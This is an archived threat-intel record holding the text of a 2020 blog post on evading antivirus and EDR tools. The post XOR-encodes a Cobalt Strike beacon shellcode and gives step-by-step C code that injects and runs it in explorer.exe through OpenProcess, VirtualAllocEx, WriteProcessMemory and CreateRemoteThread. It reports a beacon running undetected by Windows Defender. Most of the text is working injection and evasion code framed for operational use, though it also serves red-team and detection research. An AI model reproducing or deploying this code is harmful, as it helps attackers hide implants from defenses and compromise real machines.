{
    "id": "aab11316-66ad-4ea4-98a6-9abc733d8f28",
    "created_at": "2023-01-12T15:09:02.110945Z",
    "updated_at": "2025-03-27T02:09:17.930012Z",
    "deleted_at": null,
    "sha1_hash": "51ac8c194faef9296670ad020c2f585484a8052d",
    "title": "2020-07-26 - In-Memory shellcode decoding to evade AVs-EDRs",
    "authors": "",
    "file_creation_date": "2022-05-27T20:59:02Z",
    "file_modification_date": "2022-05-27T20:59:02Z",
    "file_size": 1409801,
    "plain_text": "# In-Memory shellcode decoding to evade AVs/EDRs\n\n**[shells.systems/in-memory-shellcode-decoding-to-evade-avs/](https://shells.systems/in-memory-shellcode-decoding-to-evade-avs/)**\n\nAskar 2020-07-26\n\nEstimated Reading Time: 9 minutes\n[During the previous week, I was doing some research about win32 APIs and how we can](https://docs.microsoft.com/en-us/windows/win32/apiindex/windows-api-list)\n[use them during weaponizing our attack, I already did some work related to process injection](https://github.com/mhaskar/shellcode-process-injection)\nin the past, but I was looking for something more advanced and to do an extra mile in\nprocess injection.\n\nSo, I took my simple [vanilla shellcode injection C implementation and tried to take it to the](https://github.com/mhaskar/shellcode-process-injection)\nnext level by implementing a decoding routine for it and make sure that my shellcode will be\nwritten in the memory in an encoded way then it will be decoded later on runtime.\n\nThe vanilla process injection technique is very simple to use and to implement, you just need\nto Open the process you want, Allocate space on that process, Write your shellcode then\nexecute it.\n\n\n-----\n\nWe will do almost the same thing here but I will encode my shellcode before by writing a\nsimple python script to encode my shellcode, then, later on, we will let the C code decode\nthat in runtime then write each byte in the memory after allocating the space we want.\n\nAlso, I will dig deeper inside some of WIn32 APIs and explain how each one is executed at\nlow level.\n\n**process injection 101**\n\nAs I mentioned before the vanilla process injection technique will do the following:\n\n[Open a process and retrieve a HANDLE for that process.](https://docs.microsoft.com/en-us/windows/win32/sysinfo/handles-and-objects)\nAllocate Space in the remote process (retrieve a memory address).\nWrite the data (shellcode) inside that process.\nExecute the shellcode.\n\nWe can perform these steps with a couple of Win32 APIs which are:\n\n[OpenProcess()](https://docs.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-openprocess)\n[VirtualAllocEx()](https://docs.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-virtualallocex)\n[WriteProcessMemory()](https://docs.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-writeprocessmemory)\n[CreateRemoteThread()](https://docs.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-createremotethread)\n\nIn the normal case, we will write the raw data “shellcode” directly to the memory as it is, but if\nthe shellcode is detected by AVs/EDRs they will definitely raise an alert about that, so, we\nneed to encode our shellcode and save it as encoded shellcode inside our binary, then, we\nneed to decode it and write it to the memory to avoid detection.\n\n**Shellcode encoding**\n\nWe need to encode our shellcode to avoid detection as I mentioned before and to do that,\nwe need to modify that shellcode in a reversible way that could be used to retrieve the\noriginal status of our shellcode, and we can do that by performing some changes on each\nopcode such as:\n\nXOR\nADD\nSubtract\nSWAP\n\nI will use XOR bitwise operation on each opcode of my shellcode, I will use Cobalt Strike\nbeacon as my shellcode, and it will be the following shellcode:\n```\n/* length: 887 bytes */\nunsigned char buf[] =\n\"\\xfc\\x48\\x83\\xe4\\xf0\\xe8\\xc8\\x00\\x00\\x00\\x41\\x51\\x41\\x50\\x52\\x51\\x56\\x48\\x31\\xd2\\x65\\\n\n```\n\n-----\n\nAnd the following code will be our encoder:\n```\n#!/usr/bin/python\nimport sys\nraw_data =\n\"\\xfc\\x48\\x83\\xe4\\xf0\\xe8\\xc8\\x00\\x00\\x00\\x41\\x51\\x41\\x50\\x52\\x51\\x56\\x48\\x31\\xd2\\x65\\\nnew_shellcode = []\nfor opcode in raw_data:\n    new_opcode = (ord(opcode) ^ 0x01)\n    new_shellcode.append(new_opcode)\nprint \"\".join([\"\\\\x{0}\".format(hex(abs(i)).replace(\"0x\", \"\")) for i in\nnew_shellcode])\n\n```\nThis script will read each opcode of our shellcode then it will xor it with the byte 0x01 which is\nour key in this case, then it will append each encoded opcode into a new list and finally, it will\nprint it as a shellcode like the following:\n\nWe got the encoded shellcode after running the script, we are ready now to move on.\n\nWe will now start implementing the C code that will perform the shellcode injection for us, I\nwill walk through every win32 API to explain that.\n\n**Open process and retrieve a handle**\n\nWe need to choose a process to inject our shellcode to it, and to do that, we need to retrieve\na handle for that process so we can perform some actions on it, and to do that, we will use\nOpenProcess win32 API using the following code:\n\n\n-----\n\n```\n#include &lt;windows.h&gt;\nint main(int argc, char *argv[]){\n // The PID that you want to use\n // You can use GetCurrentProcessId() to get the current PID\n int process_id = atoi(argv[1]);\n // Declare a new handle as process variable\n // PROCESS_ALL_ACCESS\n HANDLE process = OpenProcess(PROCESS_ALL_ACCESS, 0, process_id);\n // If the operation succeeded it will return the handle\n if(process){\n  printf(&quot;[+] Handle retrieved successfully!\\n&quot;);\n  // We can print it as pointer using printf\n  printf(&quot;[+] Handle value is %p\\n&quot;, process);\n }else{\n  printf(&quot;[-] Enable to retrieve process handle\\n&quot;);\n }\n}\n\n```\nThis code will take the process id that you want to get a handle for as a first argument to the\ncode, then it will use OpenProcess() with PROCESS_ALL_ACCESS access right to open the\nprocess and save the handle in the variable process and finally, it will print the handle for us.\n\n[The OpenProcess() function actually takes 3 parameters you can check them via this page.](https://docs.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-openprocess)\n\n[Also, You can check all access rights from this page.](https://docs.microsoft.com/en-us/windows/win32/procthread/process-security-and-access-rights)\n\nAnd after compiling the code and run it to retrieve the handle of the process “explorer.exe”\nwith pid 4032, we will get the following:\n\n\n-----\n\nWe retrieved the handle successfully.\n\n**Allocate space on the remote process**\n\nNext step after retrieving the handle will be Allocating space inside that process, we can do\n[that using VirtualAllocEx() using the following code:](https://docs.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-virtualallocex)\n\n\n-----\n\n```\n#include &lt;windows.h&gt;\nint main(int argc, char *argv[]){\n  char data[] = &quot;AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA&quot;;\n // The PID that you want to use\n  int process_id = atoi(argv[1]);\n // Declare a new handle as process variable\n // PROCESS_ALL_ACCESS\n HANDLE process = OpenProcess(PROCESS_ALL_ACCESS, 0, process_id);\n // If the operation succeeded it will return the handle\n if(process){\n  printf(&quot;[+] Handle retrieved successfully!\\n&quot;);\n  // We can print it as pointer using printf\n  printf(&quot;[+] Handle value is %p\\n&quot;, process);\n  // Allocate space\n  // Define the base_address variable which will save the allocated memory address\n     LPVOID base_address;\n  base_address = VirtualAllocEx(process, NULL, sizeof(data), MEM_COMMIT |\nMEM_RESERVE, PAGE_EXECUTE_READWRITE);\n     if(base_address){\n    printf(&quot;[+] Allocated based address is 0x%x\\n&quot;, base_address);\n     }else{\n          printf(&quot;[-] Unable to allocate memory ...\\n&quot;);\n     }\n }else{\n  printf(&quot;[-] Unable to retrieve process handle\\n&quot;);\n }\n}\n\n```\nI added some data in line #7 as a dump data (will be replaced with our shellcode), we should\nhave it to allocate the memory based on its size.\n\nIn line #25 we declared a variable called “base_address” as LPVOID which will represent the\nbase address of the allocated memory.\n\nAnd in line #26 we use VirtualAllocEx() and pass the following parameters for it:\n\nprocess: which is the handle that we retrieved earlier using OpenProcess()\nNull: to make sure that the function will allocate address automatically instead of using\none that we know.\nsizeof(data): the size of the data that will be written to memory\n\n\n-----\n\nMEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE: the allocation\ntype that we want to use, which describe what we want to do inside that allocated\nregion of memory which is read write execute (RWX)\n\nAllocating memory region with RWX it’s not very stealthy, and the EDRs could consider\nit as suspicious action.\n\nAnd finally, in line #29 we will print the address of the allocated memory, which we will write\nour data on, and by running the code we will get the following:\n\nWe got the address “0xa50000” as our base address.\n\nLet me explain that more and tell you what that address exactly means, and to do that, I will\nattach my debugger to explorer.exe and see what we have at that address:\n\n\n-----\n\nThen I will go to the address “0xa50000” like the following:\n\n\n-----\n\nChoose expression and enter the address:\n\nTo get the following results:\n\n\n-----\n\nAs we can see, the function VirtualAllocEx has allocated memory space in explorer.exe for\nus and we are ready to write our data.\n\n**Write data to memory**\n\nNow here is the most important part of our technique, we will decode the original opcodes\nand write it directly to memory, we will do that by start writing our data from “0xA50000” and\nincrease the address one by one reach the next memory address.\n\nWe used xor to encode our shellcode, now we will use the same value to decode each byte\nand retrieve the original status of each opcode, and that is an example about this operation:\n```\nhex(ord(\"\\xfc\") ^ 0x01) # = 0xfd\nhex(ord\"\\xfd\") ^ 0x01) # = 0xfc \n\n```\nSo by XORing each opcode with 0x01, we will retrieve the original shellcode but this time\nwithout getting caught via static analysis (signature-based) detection by AVs/EDRs because\nit will be written directly to the memory in runtime.\n\nEven with this type of encoding your payload may get flagged, so make sure to use\nstronger encoding and test it before using in your operation.\n\nThe following code will achieve that for us:\n\n\n-----\n\n```\n#include &lt;windows.h&gt;\nint main(int argc, char *argv[]){\n  unsigned char data[] =\n&quot;\\xfd\\x49\\x82\\xe5\\xf1\\xe9\\xc9\\x1\\x1\\x1\\x40\\x50\\x40\\x51\\x53\\x50\\x57\\x49\\x30\\xd3\\x6\n // The PID that you want to use\n  int process_id = atoi(argv[1]);\n // Declare a new handle as process variable\n // PROCESS_ALL_ACCESS\n HANDLE process = OpenProcess(PROCESS_ALL_ACCESS, 0, process_id);\n // If the operation succeeded it will return the handle\n if(process){\n  printf(&quot;[+] Handle retrieved successfully!\\n&quot;);\n  // We can print it as pointer using printf\n  printf(&quot;[+] Handle value is %p\\n&quot;, process);\n  // Allocate space\n  // Define the base_address variable which will save the allocated memory address\n     LPVOID base_address;\n  base_address = VirtualAllocEx(process, NULL, sizeof(data), MEM_COMMIT |\nMEM_RESERVE, PAGE_EXECUTE_READWRITE);\n     if(base_address){\n    printf(&quot;[+] Allocated based address is 0x%x\\n&quot;, base_address);\n                        // Data chars counter\n                   int i;\n                   // Base address counter\n                   int n = 0;\n                   for(i = 0; i&lt;=sizeof(data); i++){\n                        // Decode shellcode opcode\n                        char DecodedOpCode = data[i] ^ 0x01;\n                        // Write the decoded bytes in memory address\n                        if(WriteProcessMemory(process,\nbase_address+n, &amp;DecodedOpCode, 1, NULL)){\n                             printf(&quot;[+] Byte wrote\nsucessfully!\\n&quot;);\n                             // Increase memory address by 1\n\n```\n\n-----\n\n```\n                             n++;\n                        }\n                   }\n     }else{\n          printf(&quot;[-] Unable to allocate memory ...\\n&quot;);\n     }\n }else{\n  printf(&quot;[-] Unable to retrieve process handle\\n&quot;);\n }\n}\n\n```\nThis code will write our shellcode in memory after decoding each byte of it with our key\n“0x01”, as we can see in line #39 I used a for loop to move on each element of our\nshellcode, then in line #42 I XORed each element with 0x01 to retrieve the original opcode,\nand in line #45 I wrote that decoded byte to a specific location in memory and finally in line\n#51 I move the n counter which is the memory counter to the next memory address to\ndecode and write the opcode to.\n\nThe [WriteProcessMemory() took the following parameters:](https://docs.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-writeprocessmemory)\n\nprocess: which is the handle that we retrieved earlier using OpenProcess()\nbase_address+n: which is the address that we want to write our opcode to\n(base_address retrieved from VirtualAllocEx) and n is the counter to move to the next\naddress.\n&DecodedOpCode: the address of our DecodedOpCode byte.\n1: the number of written bytes which is only one byte.\nNull: Because we don’t have a pointer to receive the number of written bytes.\n\n[You can check the parameters that the WriteProcessMemory takes from this page.](https://docs.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-writeprocessmemory)\n\nAfter compiling the program and run it, we will get the following:\n\n\n-----\n\nAs we can see, we get each byte wrote in the desired address that we want, now, let’s debug\nthat using x64dbg and go to the address “0x2ec0000” to get the following:\n\n\n-----\n\nAs we can see, our original bytes were written to the addresses that we want starting from\n0x2ec0000 and everything is working very well!\n\n**Executing the shellcode**\n\nFinally, we need to execute the shellcode as a thread, and to do that, we can that using\nCreateRemoteThread() function using the following code:\n\n\n-----\n\n```\n#include &lt;windows.h&gt;\nint main(int argc, char *argv[]){\n  unsigned char data[] =\n&quot;\\xfd\\x49\\x82\\xe5\\xf1\\xe9\\xc9\\x1\\x1\\x1\\x40\\x50\\x40\\x51\\x53\\x50\\x57\\x49\\x30\\xd3\\x6\n // The PID that you want to use\n  int process_id = atoi(argv[1]);\n // Declare a new handle as process variable\n // PROCESS_ALL_ACCESS\n HANDLE process = OpenProcess(PROCESS_ALL_ACCESS, 0, process_id);\n // If the operation succeeded it will return the handle\n if(process){\n  printf(&quot;[+] Handle retrieved successfully!\\n&quot;);\n  // We can print it as pointer using printf\n  printf(&quot;[+] Handle value is %p\\n&quot;, process);\n  // Allocate space\n  // Define the base_address variable which will save the allocated memory address\n     LPVOID base_address;\n  base_address = VirtualAllocEx(process, NULL, sizeof(data), MEM_COMMIT |\nMEM_RESERVE, PAGE_EXECUTE_READWRITE);\n     if(base_address){\n    printf(&quot;[+] Allocated based address is 0x%x\\n&quot;, base_address);\n                        // Data chars counter\n                   int i;\n                   // Base address counter\n                   int n = 0;\n                   for(i = 0; i&lt;=sizeof(data); i++){\n                        // Decode shellcode opcode\n                        char DecodedOpCode = data[i] ^ 0x01;\n                        // Write the decoded bytes in memory address\n                        if(WriteProcessMemory(process,\nbase_address+n, &amp;DecodedOpCode, 1, NULL)){\n                             printf(&quot;[+] Byte wrote\nsucessfully!\\n&quot;);\n                             // Increase memory address by 1\n                             n++;\n\n```\n\n-----\n\n```\n                        }\n                   }\n                   // Run our code as RemoteThread\n                   CreateRemoteThread(process, NULL, 100,\n(LPTHREAD_START_ROUTINE)base_address, NULL, 0, 0x5151);\n     }else{\n          printf(&quot;[-] Unable to allocate memory ...\\n&quot;);\n     }\n }else{\n  printf(&quot;[-] Unable to retrieve process handle\\n&quot;);\n }\n}\n\n```\nAs we can see in line #55, we used CreateRemoteThread() function to execute our shellcode\nas a thread on explorer.exe, and CreateRemoteThread() took the following parameters:\n\nprocess: Which is the handle that we retrieved earlier using OpenProcess()\n[Null: To get default security descriptor; check this for more info.](https://docs.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-createremotethread)\n100: The initial size of the stack.\nbase_address: Which is the first opcode of our shellcode.\nNull: No parameters passed to the thread.\n0: The thread runs immediately after creation.\n0x5151: Thread ID\n\nAnd after running the code, we will get the following:\n\n\n-----\n\nWe got an active beacon running under explorer.exe without being caught by Windows\nDefender.\n\n**Conclusion**\n\nBy encoding our shellcode and decode it using this technique, we were able to bypass AV\nprotection easily and run our shellcode inside another process.\n\nYou can customize the encoder as you want but you have to edit the decoder too, also you\ncan modify the code to meet your needs on execution and some parts of the code are written\nonly for educational purposes.\n\n\n-----",
    "language": "EN",
    "sources": [
        {
            "id": "05d7b179-7656-44d8-a74c-9ab34d3df3a2",
            "created_at": "2023-01-12T14:38:44.599904Z",
            "updated_at": "2023-01-12T14:38:44.599904Z",
            "deleted_at": null,
            "name": "VXUG",
            "url": "https://www.vx-underground.org",
            "description": "vx-underground Papers",
            "reports": null
        }
    ],
    "references": [
        "https://papers.vx-underground.org/papers/Malware Defense/Malware Analysis 2020/2020-07-26 - In-Memory shellcode decoding to evade AVs-EDRs.pdf"
    ],
    "report_names": [
        "2020-07-26 - In-Memory shellcode decoding to evade AVs-EDRs.pdf"
    ],
    "threat_actors": [
        {
            "id": "610a7295-3139-4f34-8cec-b3da40add480",
            "created_at": "2023-01-06T13:46:38.608142Z",
            "updated_at": "2025-03-27T02:00:02.87217Z",
            "deleted_at": null,
            "main_name": "Cobalt",
            "aliases": [
                "Cobalt Gang",
                "GOLD KINGSWOOD",
                "COBALT SPIDER",
                "G0080",
                "Mule Libra",
                "Cobalt Group"
            ],
            "source_name": "MISPGALAXY:Cobalt",
            "tools": [],
            "source_id": "MISPGALAXY",
            "reports": null
        }
    ],
    "ts_created_at": 1673536142,
    "ts_updated_at": 1743041357,
    "ts_creation_date": 1653685142,
    "ts_modification_date": 1653685142,
    "files": {
        "pdf": "https://archive.orkl.eu/51ac8c194faef9296670ad020c2f585484a8052d.pdf",
        "text": "https://archive.orkl.eu/51ac8c194faef9296670ad020c2f585484a8052d.txt",
        "img": "https://archive.orkl.eu/51ac8c194faef9296670ad020c2f585484a8052d.jpg"
    }
}